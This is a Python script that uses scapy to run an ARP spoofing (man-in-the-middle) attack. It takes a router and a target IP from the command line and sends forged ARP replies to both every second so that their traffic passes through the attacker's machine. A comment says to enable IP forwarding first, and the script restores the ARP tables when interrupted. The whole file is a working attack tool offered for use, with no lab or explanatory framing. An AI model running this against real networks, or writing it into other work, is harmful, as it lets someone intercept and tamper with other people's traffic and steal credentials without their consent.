import scapy.all as scapy
import optparse
import time
"""RUN ONLY AFTER -> echo 1 > /proc/sys/net/ipv4/ip_forward"""


def get_arguments():

    parser = optparse.OptionParser()
    parser.add_option("-r", "--route", dest="route_ip", help="router ip address")
    parser.add_option("-t", "--target", dest="target_ip", help="target ip address")
    (options, arguments) = parser.parse_args()

    return options


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request

    answeres_list = scapy.srp(arp_request_broadcast, timeout=2, verbose=False)[0]
    mac = answeres_list[0][1].hwsrc

    return mac


def packets_create(options) -> list:
    route_ip = options.route_ip
    route_mac = get_mac(route_ip)
    target_ip = options.target_ip
    target_mac = get_mac(target_ip)

    target_packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=route_ip)
    route_packet = scapy.ARP(op=2, pdst=route_ip, hwdst=route_mac, psrc=target_ip)

    packets_list = [target_packet, route_packet]

    return packets_list


def packets_send(packets: list):
    for packet in packets:
        scapy.send(packet, verbose=False)


def restore(destantion_ip, source_ip):
    destantion_mac = get_mac(destantion_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destantion_ip, hwdst=destantion_mac,
                       psrc=source_ip, hwsrc=source_mac)

    scapy.send(packet, count=4, verbose=False)


if __name__ == "__main__":
    options = get_arguments()
    packets_list = packets_create(options)
    print("[+] Start sending packets")

    sent_pkt_count = 0
    try:
        while True:
            packets_send(packets_list)
            sent_pkt_count += 2
            print(f"\r[+] Packets sent:: {str(sent_pkt_count)}", end="")
            time.sleep(1)

    except KeyboardInterrupt:
        print("\r[+] Arp tables recovering... Please wait", end="")
        route_ip = options.route_ip
        target_ip = options.target_ip
        restore(target_ip, route_ip)
        restore(route_ip, target_ip)
        print("[-] Quitting ...")
